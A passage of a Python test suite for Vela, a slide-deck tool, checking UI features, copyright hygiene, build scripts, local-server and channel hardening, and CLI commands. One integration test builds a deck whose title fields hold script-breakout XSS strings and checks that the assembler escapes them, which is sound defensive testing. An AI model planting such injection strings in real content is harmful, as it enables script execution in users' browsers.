    # local useState collapse must be gone from ModuleList (single source of truth)
    if "useState(() => new Set())" not in lst and "collapsedSections" in lst:
        ok("CR2: ModuleList reads collapsedSections prop (no local collapse useState)")
    else:
        fail("CR2: ModuleList still owns local collapse state")
    if "collapsedSections={state.collapsedSections}" in appjs:
        ok("CR2: ModuleList wired to state.collapsedSections in part-app")
    else:
        fail("CR2: part-app does not thread collapsedSections")

    # ── CR2 B: roving ARIA tree ──
    if 'role="tree"' in lst and 'role="group"' in lst and 'role="treeitem"' in lst:
        ok("CR2: ARIA tree/group/treeitem roles present in TOC")
    else:
        fail("CR2: TOC ARIA tree roles missing")
    if "aria-expanded" in lst and "aria-selected" in lst and "tabIndex={isFocused" in lst:
        ok("CR2: section header exposes aria-expanded/selected + roving tabIndex")
    else:
        fail("CR2: header missing aria-expanded/roving tabIndex")
    if 'data-testid="toc-section-header"' in lst:
        ok("CR2: section header has stable toc-section-header test-id")
    else:
        fail("CR2: toc-section-header test-id missing")

    # ── CR2 C: disclosure keys ──
    if "onHeaderKeyDown" in lst and 'k === "ArrowRight"' in lst and 'k === "ArrowLeft"' in lst:
        ok("CR2: header onKeyDown implements Right/Left disclosure")
    else:
        fail("CR2: header disclosure keys missing")
    # Selection-follows-focus: slide-row arrows now DRIVE the real slide selection
    # (one cursor), not a separate roaming focus ring.
    if "onSlideRowKeyDown" in lst and "nav.moveSelection" in lst and "e.stopPropagation()" in lst:
        ok("CR2: slide-row arrows drive the real selection (selection-follows-focus)")
    else:
        fail("CR2: slide-row selection-follows-focus nav missing")
    # Ctrl/Cmd collapse-all mirror
    if "all: true" in lst and "ids: nav.allIds" in lst:
        ok("CR2: Ctrl/Cmd+Left/Right mirror collapse/expand all")
    else:
        fail("CR2: Ctrl/Cmd collapse-all keyboard mirror missing")
    # belt-and-suspenders guard in the global handler
    if 'closest("[role=tree]")' in slides:
        ok("CR2: global slide-nav handler bails when a treeitem holds focus")
    else:
        fail("CR2: global handler missing tree-focus guard")

    # ── CR2 D: collapsed current-slide marker (the core fix) ──
    if "showMarker" in lst and 'data-testid="toc-collapsed-marker"' in lst:
        ok("CR2 core: collapsed header renders k/N current-slide marker (toc-collapsed-marker)")
    else:
        fail("CR2 core: collapsed-header marker missing")
    if "collapsed && selected && hasSlides" in lst:
        ok("CR2 core: marker only shows on the collapsed section holding the active slide")
    else:
        fail("CR2 core: marker gating condition missing")
    if "borderLeft: `2px solid ${showMarker ? T.accent" in lst:
        ok("CR2 core: accent left-border marks the collapsed active section")
    else:
        fail("CR2 core: accent marker border missing")

    # ── CR1: gallery renders section title cards ──
    gv = slides[slides.index("function GalleryView("):slides.index("function TeacherMessage(")]
    if "item.presentCard" in gv and "buildTitleCardSlide(item, lane, branding)" in gv:
        ok("CR1: gallery allSlides prepends buildTitleCardSlide for presentCard sections")
    else:
        fail("CR1: gallery does not include section title cards")
    if "isTitleCard: true" in gv and 'data-testid={s.isTitleCard ? "gallery-title-card"' in gv:
        ok("CR1: title-card thumbnails tagged + carry gallery-title-card test-id")
    else:
        fail("CR1: title-card thumbnails not tagged/test-id'd")
    if "if (!s.isTitleCard) counts[s.itemId]" in gv:
        ok("CR1: virtual title cards excluded from the module slide count")
    else:
        fail("CR1: title cards inflate module count")
    if 's.isTitleCard ? null :' in gv and "s.isTitleCard ? undefined :" in gv:
        ok("CR1: title cards are non-draggable (excluded from drag hit-testing)")
    else:
        fail("CR1: title cards not excluded from drag")


# ━━━ IP Hygiene Tests ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def test_ip_hygiene():
    print("\n── IP Hygiene Tests ──")

    # 1. Copyright header in EVERY part-file (count dynamically — a hardcoded count
    #    hid part-pptx.jsx's missing header: 13 files had it, the 14th didn't, and the
    #    check only asserted "13 present" rather than "all present").
    part_jsx = sorted(f for f in os.listdir(PARTS_DIR) if f.endswith(".jsx"))
    copyright_count = sum(
        1 for f in part_jsx
        if "© 2025-present Rui Quintino" in open(os.path.join(PARTS_DIR, f), encoding="utf-8").readline()
    )
    if copyright_count == len(part_jsx):
        ok(f"Copyright header in all {copyright_count}/{len(part_jsx)} part-files")
    else:
        missing = [f for f in part_jsx
                   if "© 2025-present Rui Quintino" not in open(os.path.join(PARTS_DIR, f), encoding="utf-8").readline()]
        fail("Copyright headers", f"only {copyright_count}/{len(part_jsx)} files — missing: {missing}")

    # 2. Copyright header in build scripts
    script_count = 0
    for f, sdir in [("concat.py", DEV_SCRIPTS), ("assemble.py", SCRIPTS), ("validate.py", SCRIPTS)]:
        path = os.path.join(sdir, f)
        if os.path.exists(path):
            content = open(path, encoding="utf-8").read()[:200]
            if "© 2025-present Rui Quintino" in content:
                script_count += 1
    if script_count == 3:
        ok(f"Copyright header in all {script_count}/3 build scripts")
    else:
        fail(f"Script copyright headers", f"only {script_count}/3")

    # 3. NOTICE file exists with dependency audit
    notice_path = os.path.join(REPO_ROOT, "NOTICE")
    if os.path.exists(notice_path):
        content = open(notice_path, encoding="utf-8").read()
        has_deps = all(d in content for d in ["React", "lucide-react", "html2canvas", "MIT", "ISC"])
        if has_deps:
            ok("NOTICE file present with dependency audit")
        else:
            fail("NOTICE file", "missing expected dependencies")
    else:
        fail("NOTICE file exists")

    # 4. CLA in CONTRIBUTING.md
    contrib_path = os.path.join(REPO_ROOT, "CONTRIBUTING.md")
    if os.path.exists(contrib_path):
        content = open(contrib_path, encoding="utf-8").read()
        has_cla = "Contributor License Agreement" in content and "Signed-off-by" in content
        has_ai = "AI-Generated" in content or "AI-generated" in content or "ai-generated" in content.lower()
        if has_cla:
            ok("CONTRIBUTING.md has CLA with sign-off requirement")
        else:
            fail("CONTRIBUTING.md CLA", "missing CLA section")
        if has_ai:
            ok("CONTRIBUTING.md has AI-generated code disclosure policy")
        else:
            fail("CONTRIBUTING.md AI disclosure")
    else:
        fail("CONTRIBUTING.md exists")

    # 5. LICENSE has commercial contact
    license_path = os.path.join(REPO_ROOT, "LICENSE")
    if os.path.exists(license_path):
        content = open(license_path, encoding="utf-8").read()
        if "info@agentia.pt" in content:
            ok("LICENSE has commercial licensing contact")
        else:
            fail("LICENSE commercial contact", "missing info@agentia.pt")
    else:
        fail("LICENSE exists")

    # 6. No personal info leaks (only copyright + LinkedIn in app footer)
    all_jsx = ""
    for f in os.listdir(PARTS_DIR):
        if f.endswith(".jsx"):
            all_jsx += open(os.path.join(PARTS_DIR, f), encoding="utf-8").read()
    rui_refs = [m.start() for m in re.finditer(r"Rui Quintino", all_jsx)]
    # Should only appear in copyright header lines and app footer (linkedin link)
    non_header = [r for r in rui_refs if "© 2025" not in all_jsx[max(0,r-80):r] and "linkedin" not in all_jsx[max(0,r-200):r+100].lower() and "Created by" not in all_jsx[max(0,r-150):r]]
    if not non_header:
        ok("'Rui Quintino' only in copyright headers and footer")
    else:
        fail("Name leak", f"found {len(non_header)} non-header/footer reference(s)")


# ━━━ Integration Tests ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def test_integration():
    print("\n── Integration Tests ──")

    tmpdir = tempfile.mkdtemp(prefix="vela-test-")

    try:
        # 1. Concat builds successfully
        out_template = os.path.join(tmpdir, "vela-built.jsx")
        result = subprocess.run(
            [sys.executable, os.path.join(DEV_SCRIPTS, "concat.py"), PARTS_DIR, out_template],
            capture_output=True, text=True
        )
        if result.returncode == 0 and os.path.exists(out_template):
            ok("concat.py builds monolith from parts")
            size_kb = os.path.getsize(out_template) // 1024
            if size_kb > 100:
                ok(f"Built template is {size_kb}KB (sanity check >100KB)")
            else:
                fail(f"Template size sanity", f"only {size_kb}KB")
        else:
            fail("concat.py builds", result.stderr.strip())
            return  # can't continue without template

        # 2. Built template has STARTUP_PATCH marker
        built = open(out_template, encoding="utf-8").read()
        if "const STARTUP_PATCH = null;" in built:
            ok("Built template has STARTUP_PATCH marker")
        else:
            fail("Built template STARTUP_PATCH marker")

        # 3. Validate demo deck
        starter = os.path.join(EXAMPLES, "vela-demo.vela")
        result = subprocess.run(
            [sys.executable, os.path.join(SCRIPTS, "validate.py"), starter],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            ok("validate.py passes on vela-demo.vela")
        else:
            fail("validate.py on vela-demo.vela", result.stdout + result.stderr)

        # 4. Assemble produces a valid artifact
        out_artifact = os.path.join(tmpdir, "assembled.jsx")
        result = subprocess.run(
            [sys.executable, os.path.join(SCRIPTS, "assemble.py"), starter, out_artifact],
            capture_output=True, text=True,
            env={**os.environ, "PYTHONPATH": SCRIPTS}
        )
        if result.returncode == 0 and os.path.exists(out_artifact):
            artifact = open(out_artifact, encoding="utf-8").read()
            # Check that STARTUP_PATCH was replaced with actual data
            if "const STARTUP_PATCH = null;" not in artifact and "const STARTUP_PATCH = {" in artifact:
                ok("assemble.py injects deck data into template")
            else:
                fail("assemble.py injection", "STARTUP_PATCH not replaced")
            # Check artifact size is larger than template (deck data was added)
            artifact_kb = os.path.getsize(out_artifact) // 1024
            if artifact_kb > size_kb:
                ok(f"Assembled artifact ({artifact_kb}KB) > template ({size_kb}KB)")
            else:
                fail("Artifact size", f"artifact {artifact_kb}KB should be > template {size_kb}KB")
        else:
            fail("assemble.py builds artifact", result.stderr.strip())

        # 4b. Regression: every char that can break out of a <script> block
        # (HTML parser) or terminate a JS string literal (JS parser) must be
        # escaped in the STARTUP_PATCH region. The assembled .jsx is loaded
        # inside <script type="text/babel"> by both app/local.html and the
        # Claude.ai artifact viewer. Covered chars: < > & U+2028 U+2029.
        evil_deck = {
            "deckTitle": "Evil </script><script>x</script> & <!-- -->    ",
            "lanes": [{
                "title": "x",
                "items": [{
                    "title": "</script><script>window.__pwned=1</script>",
                    "status": "todo",
                    "slides": [{"bg": "#000", "color": "#fff", "duration": 10,
                                "blocks": [{"type": "heading", "text": "hi"}]}]
                }]
            }]
        }
        evil_in = os.path.join(tmpdir, "evil.vela")
        evil_out = os.path.join(tmpdir, "evil.jsx")
        with open(evil_in, "w", encoding="utf-8") as f:
            json.dump(evil_deck, f, ensure_ascii=False)
        result = subprocess.run(
            [sys.executable, os.path.join(SCRIPTS, "assemble.py"), evil_in, evil_out],
            capture_output=True, text=True,
            env={**os.environ, "PYTHONPATH": SCRIPTS}
        )
        if result.returncode == 0 and os.path.exists(evil_out):
            evil_artifact = open(evil_out, encoding="utf-8").read()
            patch_idx = evil_artifact.find("const STARTUP_PATCH = {")
            patch_end = evil_artifact.find("};\n", patch_idx) if patch_idx >= 0 else -1
            patch_region = evil_artifact[patch_idx:patch_end] if patch_idx >= 0 else ""
            # Bad: any raw < > & or line-separator inside the JSON value.
            # (The literal "const STARTUP_PATCH = {" prefix has its own = sign and
            # braces, but no < > & or U+2028/9, so the region is clean to scan.)
            json_region = patch_region[len("const STARTUP_PATCH = "):] if patch_region else ""
            bad = [c for c in ("<", ">", "&", " ", " ") if c in json_region]
            # Good: the escaped forms must be present (proof the deck data made it through).
            need = ("\\u003c", "\\u003e", "\\u0026", "\\u2028", "\\u2029")
            missing = [e for e in need if e not in json_region]
            if not bad and not missing:
                ok("assemble.py escapes <,>,&,U+2028,U+2029 in deck content (no breakout)")
            elif bad:
                fail("assemble.py script-context escape",
                     f"unescaped {bad!r} in STARTUP_PATCH region — XSS / JS-string breakout possible")
            else:
                fail("assemble.py script-context escape",
                     f"escape forms missing from output: {missing!r}")
        else:
            fail("assemble.py evil-deck run", result.stderr.strip())

        # 5. Version extraction works
        version_match = re.search(r'const VELA_VERSION\s*=\s*"([^"]+)"', built)
        if version_match:
            ok(f"VELA_VERSION extractable: {version_match.group(1)}")
        else:
            fail("VELA_VERSION extraction")

    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ━━━ v10 Feature Tests ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def test_v10_features():
    print("\n── v10 Feature Tests ──")

    # Template must exist
    if not os.path.exists(TEMPLATE):
        fail("Template exists for v10 tests")
        return
    tpl = open(TEMPLATE, encoding="utf-8").read()

    # v10+ version
    m = re.search(r'VELA_VERSION = "(\d+\.\d+)"', tpl)
    if m and int(m.group(1).split('.')[0]) >= 10:
        ok(f"VELA_VERSION is {m.group(1)}")
    else:
        fail("VELA_VERSION is 10+")
    # VELA_LOCAL_MODE constant
    if "VELA_LOCAL_MODE" in tpl:
        ok("VELA_LOCAL_MODE constant present")
    else:
        fail("VELA_LOCAL_MODE constant present")

    # Teacher mode
    if "buildTeacherPrompt" in tpl and "callVeraTeacher" in tpl:
        ok("Teacher mode engine functions present")
    else:
        fail("Teacher mode engine", "missing buildTeacherPrompt or callVeraTeacher")

    if "TeacherPanel" in tpl and "TeacherMessage" in tpl:
        ok("TeacherPanel and TeacherMessage components present")
    else:
        fail("Teacher components")

    # Gallery view
    if "GalleryView" in tpl:
        ok("GalleryView component present")
    else:
        fail("GalleryView component")

    if "ZOOM_SIZES" in tpl:
        ok("Gallery zoom feature present")
    else:
        fail("Gallery zoom")

    # Reducer: veraMode, teacher actions
    if "veraMode" in tpl and "teacherHistory" in tpl:
        ok("Reducer has veraMode and teacherHistory state")
    else:
        fail("Reducer teacher state")

    if "SET_VERA_MODE" in tpl and "TEACHER_MSG" in tpl:
        ok("Reducer has teacher action types")
    else:
        fail("Reducer teacher actions")

    # Heading strip
    if "headingText" in tpl and 'replace(/\\*\\*/g' in tpl:
        ok("Heading block strips ** markdown")
    else:
        fail("Heading strip")

    # Live sync
    if "__velaReceiveDeckUpdate" in tpl and "__velaSendDeckUpdate" in tpl:
        ok("Live sync handlers present (receive + send)")
    else:
        fail("Live sync handlers")

    if "__velaGetCurrentSlide" in tpl:
        ok("Channel context export (__velaGetCurrentSlide) present")
    else:
        fail("Channel context export")

    # State prop passed to SlidePanel
    if "state={state}" in tpl and "SlidePanel" in tpl:
        ok("SlidePanel receives state prop")
    else:
        fail("SlidePanel state prop")

    # Demo: 19 scenes
    if "19 scenes" in tpl:
        ok("Demo has 19 scenes")
    else:
        fail("Demo scene count")


# ━━━ Channel & Local HTML Tests ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def test_channel_local():
    print("\n── Channel & Local HTML Tests ──")

    local_html = LOCAL_HTML
    if not os.path.exists(local_html):
        fail("local.html exists")
        return
    html = open(local_html, encoding="utf-8").read()

    # Import map
    if "importmap" in html and "esm.sh/react" in html:
        ok("local.html has importmap for ES modules")
    else:
        fail("importmap")

    # Long-poll sync (not WebSocket/SSE)
    if "/poll" in html and "WebSocket" not in html and "EventSource" not in html.split("Long-poll")[0]:
        ok("local.html uses long-polling (not WebSocket/SSE)")
    else:
        # Check more carefully
        if "/poll?v=" in html:
            ok("local.html uses long-polling")
        else:
            fail("long-polling sync")

    # Channel bridge UI
    if "claude-fab" in html and "__VELA_CHANNEL_PORT__" in html:
        ok("local.html has Claude FAB with channel port injection")
    else:
        fail("Claude FAB")

    if "claude-prompt-overlay" in html and "claude-prompt-box" in html:
        ok("local.html has prompt overlay UI")
    else:
        fail("Prompt overlay")

    # Contextual presets
    if "slidePresets" in html and "deckPresets" in html:
        ok("local.html has contextual presets (slide vs deck)")
    else:
        fail("Contextual presets")

    # Toast system
    if "claude-toast" in html and "showToast" in html:
        ok("local.html has toast notification system")
    else:
        fail("Toast system")

    # Loading screen
    if "sail" in html.lower() and "vela-loading" in html:
        ok("local.html has themed loading screen")
    else:
        fail("Loading screen")

    # Storage polyfill
    if "window.storage" in html:
        ok("local.html has storage polyfill")
    else:
        fail("Storage polyfill")

    # Channel server
    channel_ts = os.path.join(DEV_DIR, "channel", "vela-channel.ts")
    if os.path.exists(channel_ts):
        ch = open(channel_ts, encoding="utf-8").read()
        if "claude/channel" in ch:
            ok("Channel server declares claude/channel capability")
        else:
            fail("Channel capability")
        if "reply" in ch and "ListToolsRequestSchema" in ch:
            ok("Channel server exposes reply tool")
        else:
            fail("Channel reply tool")
        if "SPEED RECIPES" in ch or "TRANSLATE ONE SLIDE" in ch:
            ok("Channel instructions include speed recipes")
        else:
            fail("Channel speed recipes")

        # SECURITY: /action drives the developer's own Claude Code session, so the
        # bridge must stay opt-in and locally scoped. Same model as agent_backend.py.
        # This file is not executable in CI (needs the MCP SDK), so assert statically.
        if "VELA_CHANNEL_HTTP" in ch and "HTTP_ENABLED" in ch:
            ok("Channel HTTP bridge is opt-in (VELA_CHANNEL_HTTP)")
        else:
            fail("Channel HTTP bridge opt-in gate")
        if 'httpServer.listen(PORT, HOST' in ch and 'const HOST = "127.0.0.1"' in ch:
            ok("Channel binds loopback only")
        else:
            fail("Channel loopback bind")
        if '"0.0.0.0"' not in ch:
            ok("Channel never binds all interfaces")
        else:
            fail("Channel binds 0.0.0.0")
        if "timingSafeEqual" in ch and "x-vela-token" in ch:
            ok("Channel gates requests on a token (constant-time compare)")
        else:
            fail("Channel token gate")
        # A minted token must never reach LOG_PATH — that file outlives the run.
        if "logSecret" in ch and "appendFileSync" not in ch.split("function logSecret")[1].split("}")[0]:
            ok("Channel prints the minted token to stderr only")
        else:
            fail("Channel token kept out of the log file")
        # EventSource cannot set headers; ?token= is allowed for /events ONLY.
        if 'pathOf(req) === "/events" && tokenMatches(query.get("token")' in ch:
            ok("Channel accepts ?token= for /events only (EventSource support)")
        else:
            fail("Channel /events query-token support")
        if "url.pathname" in ch and 'req.url === "/action"' not in ch:
            ok("Channel routes on pathname (query strings cannot bypass routes)")
        else:
            fail("Channel pathname routing")
        if "isLoopbackHost" in ch and "isAllowedOrigin" in ch:
            ok("Channel validates Host and Origin (DNS-rebinding defense)")
        else:
            fail("Channel Host/Origin validation")
        if "isAllowedOrigin(req.headers.origin)" in ch:
            ok("Channel withholds CORS grant from foreign origins")
        else:
            fail("Channel CORS gating")
    else:
        fail("Channel server file exists")

    # Serve.py
    serve_py = os.path.join(DEV_SCRIPTS, "serve.py")
    if os.path.exists(serve_py):
        srv = open(serve_py, encoding="utf-8").read()
        if "127.0.0.1" in srv and "--host" in srv:
            ok("serve.py binds localhost by default with --host option")
        else:
            fail("serve.py bind address")
        if "channel_port" in srv and "__VELA_CHANNEL_PORT__" in srv:
            ok("serve.py injects channel port into HTML")
        else:
            fail("serve.py channel port")
        if "__VELA_DECK_PATH__" in srv:
            ok("serve.py injects deck path into HTML")
        else:
            fail("serve.py deck path")
        if "escape_for_script_context(deck_json_str)" in srv:
            ok("serve.py escapes deck JSON for <script> context (helper wired)")
        else:
            fail("serve.py XSS escape",
                 "expected call to escape_for_script_context(deck_json_str) before STARTUP_PATCH injection")
        if "long-poll" in srv.lower() or "DeckVersionTracker" in srv:
            ok("serve.py uses long-polling with version tracker")
        else:
            fail("serve.py long-polling")
    else:
        fail("serve.py exists")


# ━━━ Server Hardening & Lifecycle Tests ━━━━━━━━━━━━━━━━━━━━━━━━━━━

def test_server_hardening():
    print("\n── Server Hardening & Lifecycle Tests ──")

    tpl = open(os.path.join(SKILL_DIR, "app", "vela.jsx"), encoding="utf-8").read()
    serve_src = open(os.path.join(DEV_SCRIPTS, "serve.py"), encoding="utf-8").read()
    vela_src = open(os.path.join(SCRIPTS, "vela.py"), encoding="utf-8").read()
    skill_md = open(os.path.join(SKILL_DIR, "SKILL.md"), encoding="utf-8").read()

    # ── Desktop <meta> CSP: img-src/font-src must not permit https: egress ──
    # Regression guard for the desktop image/font beacon hardening: the Neutralino
    # shell's meta CSP must match serve.py's tighter posture (no https: in img/font
    # sinks) so a render-time image/font fetch is CSP-blocked on desktop too.
    _nl_index = os.path.join(REPO_ROOT, "vela-neutralino", "resources", "index.html")
    nl_index_src = open(_nl_index, encoding="utf-8").read()
    import re as _re
    _csp_m = _re.search(r'Content-Security-Policy"\s+content="([^"]*)"', nl_index_src)
    if _csp_m:
        _csp = _csp_m.group(1)
        _dirs = {}
        for _seg in _csp.split(";"):
            _seg = _seg.strip()
            if not _seg:
                continue
            _name, _, _val = _seg.partition(" ")
            _dirs[_name.strip()] = _val.strip()
        if "https:" not in _dirs.get("img-src", ""):
            ok("Desktop CSP img-src does not permit https: egress")
        else:
            fail("Desktop CSP img-src permits https:", _dirs.get("img-src", ""))
        if "https:" not in _dirs.get("font-src", ""):
            ok("Desktop CSP font-src does not permit https: egress")
        else:
            fail("Desktop CSP font-src permits https:", _dirs.get("font-src", ""))
    else:
        fail("Desktop CSP meta tag not found in vela-neutralino/resources/index.html")

    # ── Arrow keys: Up/Down same as Left/Right ──
    if '"ArrowRight" || e.key === "ArrowDown"' in tpl:
        ok("ArrowDown handled same as ArrowRight")
    else:
        fail("ArrowDown = ArrowRight")

    if '"ArrowLeft" || e.key === "ArrowUp"' in tpl:
        ok("ArrowUp handled same as ArrowLeft")
    else:
        fail("ArrowUp = ArrowLeft")

    # Verify old module-jumping Up/Down code is removed
    if 'e.key === "ArrowDown" && curIdx >= 0' not in tpl:
        ok("Old ArrowDown module-jump code removed")
    else:
        fail("Old ArrowDown module-jump still present")

    # ── Auto-refresh deck list ──
    # Folder-browser client code lives in tools/vela-dev/browser.js — it is
    # served as an external script so the browser page can run with no
    # 'unsafe-inline' in script-src.
    browser_js = open(os.path.join(os.path.dirname(DEV_SCRIPTS), "browser.js"),
                      encoding="utf-8").read()
    if "setInterval(fetchDecks, 3000)" in browser_js:
        ok("Deck list auto-refreshes every 3s")
    else:
        fail("Deck list auto-refresh")

    # ── .vela extension enforcement ──
    if 'DECK_EXT = ".vela"' in serve_src:
        ok("DECK_EXT constant defined as .vela")
    else:
        fail("DECK_EXT constant")

    if 'deck_name.endswith(DECK_EXT)' in serve_src or 'not deck_name.endswith(DECK_EXT)' in serve_src:
        ok(".vela extension enforced on endpoints")
    else:
        fail(".vela extension enforcement")

    if 'Only .vela files can be served' in serve_src:
        ok("403 message for non-.vela serve")
    else:
        fail("403 serve message")

    if 'Only .vela files can be polled' in serve_src:
        ok("403 message for non-.vela poll")
    else:
        fail("403 poll message")

    if 'Only .vela files can be saved' in serve_src:
        ok("403 message for non-.vela save")
    else:
        fail("403 save message")

    # ── Folder-only mode ──
    if 'folder_mode' not in serve_src:
        ok("Single-file mode removed (no folder_mode flag)")
    else:
        fail("folder_mode flag still present")

    if '_route_single_get' not in serve_src and '_route_single_post' not in serve_src:
        ok("Single-mode routing methods removed")
    else:
        fail("Single-mode routing still present")

    if '_run_single' not in serve_src:
        ok("_run_single method removed")
    else:
        fail("_run_single still present")

    # ── Upload removal ──
    if '_handle_upload' not in serve_src:
        ok("Upload handler removed")
    else:
        fail("Upload handler still present")

    if 'api/upload' not in serve_src:
        ok("Upload route removed")
    else:
        fail("Upload route still present")

    # ── Runtime file .vela.env ──
    if 'RUNTIME_FILE = ".vela.env"' in serve_src:
        ok("Runtime file constant is .vela.env")
    else:
        fail("Runtime file constant")

    # The runtime file is addressed through one helper (dir_fd-relative where
    # the platform supports it), never by an ad-hoc path built at each call site.
    if '_runtime_target' in serve_src:
        ok("_runtime_target helper present")
    else:
        fail("_runtime_target helper")

    # ── Server lifecycle ──
    if '_cleanup_stale_server' in serve_src:
        ok("Stale server cleanup present")
    else:
        fail("Stale server cleanup")

    if '_is_pid_alive' in serve_src:
        ok("PID alive check present")
    else:
        fail("PID alive check")

    if '_is_python_process' in serve_src:
        ok("Python process check present (PID recycling guard)")
    else:
        fail("Python process check")

    if '_pid_holds_port' in serve_src:
        ok("Port ownership check present")
    else:
        fail("Port ownership check")

    if '_register_cleanup' in serve_src and 'atexit' in serve_src:
        ok("Cleanup registered via atexit + signals")
    else:
        fail("atexit cleanup")

    if '--replace' in serve_src and '_force_kill' in serve_src:
        ok("--replace flag supported")
    else:
        fail("--replace flag")

    # ── Token security ──
    if 'see .vela.env' in serve_src or 'see {self.RUNTIME_FILE}' in serve_src:
        ok("Token not printed to console (references .vela.env)")
    else:
        fail("Token console display")

    # ── subprocess import at module level ──
    if re.search(r'^import subprocess$', serve_src, re.MULTILINE):
        ok("subprocess imported at module level in serve.py")
    else:
        fail("subprocess module-level import")

    # ── sys.executable in vela.py ──
    if 'sys.executable' in vela_src and '"python3"' not in vela_src.split("def deck_validate")[1].split("def deck_ship")[0]:
        ok("vela.py uses sys.executable (not hardcoded python3)")
    else:
        fail("sys.executable usage")

    # ── Lean skill: server command was relocated out of the shipped skill ──
    # The local-preview server (serve.py) now lives under tools/vela-dev/ and is
    # invoked directly; the `vela server` command was dropped from vela.py.
    if 'def server_start' not in vela_src and 'def server_stop' not in vela_src:
        ok("vela.py no longer ships the local-server command")
    else:
        fail("server command relocated", "server_start/server_stop still in vela.py")

    result = subprocess.run([sys.executable, os.path.join(SCRIPTS, "vela.py"), "--capabilities", "--json"],
                            capture_output=True, text=True)
    if '"server"' not in result.stdout:
        ok("--capabilities no longer lists server")
    else:
        fail("--capabilities server", result.stdout[:200])

    # ── SKILL.md: lean, author→ship only ──
    if 'vela server start' not in skill_md:
        ok("SKILL.md no longer references vela server start")
    else:
        fail("SKILL.md server start", "SKILL.md still references vela server start")

    if 'vela deck serve' not in skill_md:
        ok("SKILL.md no longer references vela deck serve")
    else:
        fail("SKILL.md still has deck serve")

    # ── .vela example decks exist ──
    examples_dir = os.path.join(REPO_ROOT, "examples")
    vela_decks = [f for f in os.listdir(examples_dir) if f.endswith(".vela")]
    json_decks = [f for f in os.listdir(examples_dir) if f.endswith(".json")]
    if len(vela_decks) >= 5:
        ok(f"Example decks use .vela extension ({len(vela_decks)} files)")
    else:
        fail("Example .vela decks", f"found {len(vela_decks)}")

    if len(json_decks) == 0:
        ok("No .json example decks remain")
    else:
        fail("Legacy .json decks", f"{len(json_decks)} still present")

    # ── Ship output uses .vela ──
    if 'basename + ".vela"' in vela_src:
        ok("Ship output uses .vela extension")
    else:
        fail("Ship .vela extension")

    # ── Windows errno expansion ──
    if '10048' in serve_src and '10013' in serve_src:
        ok("Windows EADDRINUSE/EACCES errno codes handled")
    else:
        fail("Windows errno codes")

    # ── Test --all flag ──
    if '--all' in open(__file__, encoding="utf-8").read() and 'run_server_tests' in open(__file__, encoding="utf-8").read():
        ok("Test suite supports --all flag for unified testing")
    else:
        fail("--all flag support")


# ━━━ CLI Command Tests ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def test_cli_commands():
    print("\n── CLI Command Tests ──")

    vela = os.path.join(SCRIPTS, "vela.py")
    tmpdir = tempfile.mkdtemp(prefix="vela-cli-test-")

    # Create a test deck
    test_deck = {
        "deckTitle": "CLI Test Deck",
        "lanes": [{"title": "Main", "items": [{
            "title": "Test Module",
            "status": "done",
            "importance": "must",
            "slides": [
                {"bg": "#0f172a", "color": "#e2e8f0", "accent": "#3b82f6", "duration": 30,
                 "blocks": [
                     {"type": "badge", "text": "SECTION"},
                     {"type": "heading", "text": "Test Heading One", "size": "2xl"},
                     {"type": "text", "text": "Body text for slide one.", "size": "md", "color": "#94a3b8"},
                 ]},
                {"bg": "#0f172a", "color": "#e2e8f0", "accent": "#3b82f6", "duration": 60,
                 "blocks": [
                     {"type": "badge", "text": "TOOLS"},
                     {"type": "heading", "text": "Test Heading Two", "size": "2xl"},
                     {"type": "bullets", "items": ["Item A", "Item B", "Item C"]},
                 ]},
                {"bg": "#1e293b", "color": "#e2e8f0", "accent": "#3b82f6", "duration": 90,
                 "blocks": [
                     {"type": "heading", "text": "Test Heading Three", "size": "2xl"},
                     {"type": "flow", "items": [
                         {"icon": "Eye", "label": "See", "sublabel": "Observe"},
                         {"icon": "Brain", "label": "Think", "sublabel": "Plan"},
                         {"icon": "Zap", "label": "Act", "sublabel": "Execute"},
                     ]},
                 ]},
                {"bg": "#0f172a", "color": "#e2e8f0", "accent": "#3b82f6", "duration": 45,
                 "blocks": [
                     {"type": "heading", "text": "Test Table Slide", "size": "2xl"},
                     {"type": "table", "headers": ["Name", "Score"], "rows": [["Alice", "95"], ["Bob", "87"]]},
                 ]},
                {"bg": "#0f172a", "color": "#e2e8f0", "accent": "#3b82f6",
                 "blocks": [
                     {"type": "heading", "text": "No Duration Slide", "size": "2xl"},
                     {"type": "text", "text": "This slide has no duration.", "size": "md"},
                 ]},
            ]
        }]}]
    }

    deck_path = os.path.join(tmpdir, "test-deck.json")
    with open(deck_path, "w", encoding="utf-8") as f:
        json.dump(test_deck, f, ensure_ascii=False)

    def run_vela(*args):
        cmd = [sys.executable, vela] + list(args)
        return subprocess.run(cmd, capture_output=True, text=True, cwd=tmpdir)

    try:
        # ── capabilities ──
        r = run_vela("--capabilities")
        if r.returncode == 0:
            caps = json.loads(r.stdout)
            cmds = caps.get("resources", {}).get("deck", {}).get("commands", {})
            for expected in ["list", "validate", "split", "dump", "stats", "find", "extract-text", "patch-text", "replace-text"]:
                if expected in cmds:
                    ok(f"--capabilities lists '{expected}'")
                else:
                    fail(f"--capabilities lists '{expected}'")
        else:
            fail("--capabilities returns valid JSON", r.stderr)

        # ── deck list ──
        r = run_vela("deck", "list", deck_path)
        if r.returncode == 0 and "5 slides" in r.stdout.lower() or "Total: 5" in r.stdout:
            ok("deck list shows correct slide count")
        else:
            fail("deck list", r.stdout + r.stderr)

        # ── deck validate ──
        r = run_vela("deck", "validate", deck_path)
        # Test deck intentionally has a missing-duration slide, so validate may report errors
        if "Deck Stats" in r.stdout or "slides" in r.stdout.lower():
            ok("deck validate runs and produces output")
        else:
            fail("deck validate", r.stdout + r.stderr)

        # ── deck dump ──
        r = run_vela("deck", "dump", deck_path)
        if r.returncode == 0 and "Test Heading One" in r.stdout and "Test Heading Two" in r.stdout:
            ok("deck dump shows slide headings")
        else:
            fail("deck dump", r.stdout[:200])

        r = run_vela("deck", "dump", deck_path, "--full")
        if r.returncode == 0 and "Body text for slide one" in r.stdout:
            ok("deck dump --full shows all text fields")
        else:
            fail("deck dump --full", r.stdout[:200])

        # ── deck stats ──
        r = run_vela("deck", "stats", deck_path)
